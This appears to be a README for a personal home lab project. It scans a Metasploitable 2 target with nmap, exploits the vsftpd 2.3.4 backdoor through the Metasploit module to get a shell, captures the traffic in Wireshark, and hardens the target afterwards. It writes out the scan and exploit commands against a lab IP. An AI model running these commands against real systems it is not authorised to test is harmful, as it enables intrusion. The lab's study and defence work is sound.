# 🔐 Home Lab – Virtual Network Cyber Security Project

## 📌 Overview
This project demonstrates the design and implementation of a virtual cyber security lab used to simulate real-world attacks and defensive techniques. The lab environment allows for safe testing of penetration testing tools, network analysis, and system hardening.

The purpose of this project is to develop practical cyber security skills aligned with real-world scenarios, including identifying vulnerabilities, exploiting weaknesses, and applying mitigation strategies.

---

## 🖥️ Lab Environment

### Virtualisation Platform
- VirtualBox

### Virtual Machines
- Kali Linux (Attacker machine)
- Metasploitable 2 (Vulnerable target machine)
- Windows VM (optional)

---

## 🌐 Network Configuration

The lab is configured using an isolated internal network to safely simulate attacks.

Example IP configuration:

Kali Linux:        192.168.56.101  
Metasploitable:    192.168.56.102  

---

## 🛠️ Tools Used

- Nmap – Network scanning and enumeration  
- Wireshark – Packet capture and analysis  
- Metasploit Framework – Exploitation  

---

## ⚔️ Activities Performed

### 1. Network Scanning

Nmap was used to identify open ports and services running on the target machine.

Command used:

```
nmap -sV -A 192.168.56.102
```

Example output:

```
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.3.4
22/tcp   open  ssh     OpenSSH 4.7p1
80/tcp   open  http    Apache httpd 2.2.8
139/tcp  open  netbios-ssn Samba smbd 3.X
```

This scan identified multiple outdated services that are known to contain vulnerabilities.

---

### 2. Vulnerability Identification

The scan results were analysed to identify potential vulnerabilities.

Key findings:
- vsftpd 2.3.4 → known backdoor vulnerability  
- Outdated Apache version → potential remote exploits  
- Samba service → potential misconfiguration risks  

These findings demonstrate how attackers identify weak points in a system before attempting exploitation.

---

### 3. Exploitation

The Metasploit Framework was used to exploit the vsftpd vulnerability.

Steps:

```
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST 192.168.56.102
run
```

---

## ✅ Exploitation Result

After running the exploit, a shell session was successfully opened on the target machine.

This confirmed that the vulnerability was exploitable and demonstrated how an attacker could gain unauthorised access to a system.

---

### 4. Traffic Analysis

Wireshark was used to capture and analyse network traffic during the attack.

Key observations:
- TCP handshake process between attacker and target  
- Suspicious traffic during exploitation attempts  
- Visible communication patterns that could indicate malicious behaviour  

This demonstrates how defenders can monitor and detect potential attacks through packet inspection.

---

### 5. System Hardening

Basic defensive measures were applied to reduce vulnerabilities:

- Disabled unnecessary services  
- Restricted open ports  
- Applied firewall rules  

The system was re-scanned to confirm a reduced attack surface and improved security posture.

---

## 🏢 Real-World Scenario

In a workplace environment, a vulnerable service such as vsftpd 2.3.4 could allow an attacker to gain unauthorised access to a server.

For example, if this system was part of a company network, an attacker could:
- Gain initial access via the FTP vulnerability  
- Move laterally across internal systems  
- Access sensitive or confidential data  

This highlights the importance of patch management, secure configuration, and continuous monitoring within an organisation.

---

## 🧠 Key Learning Outcomes

- Practical experience with network scanning and enumeration  
- Understanding of real-world vulnerabilities and exploitation techniques  
- Ability to use industry tools such as Nmap, Wireshark, and Metasploit  
- Awareness of attacker methodologies and defensive strategies  
- Improved understanding of system hardening and risk reduction  

---

## 📁 Project Structure

Home-Lab-Virtual-Network
│
├── README.md
├── reports/
└── notes/

---

## 📊 Conclusion

This project demonstrates hands-on cyber security skills including network enumeration, vulnerability assessment, exploitation, and defensive strategies.

It highlights the importance of identifying vulnerabilities early and applying appropriate mitigation techniques to reduce risk. This lab provides a strong foundation for further development in penetration testing and security operations roles.
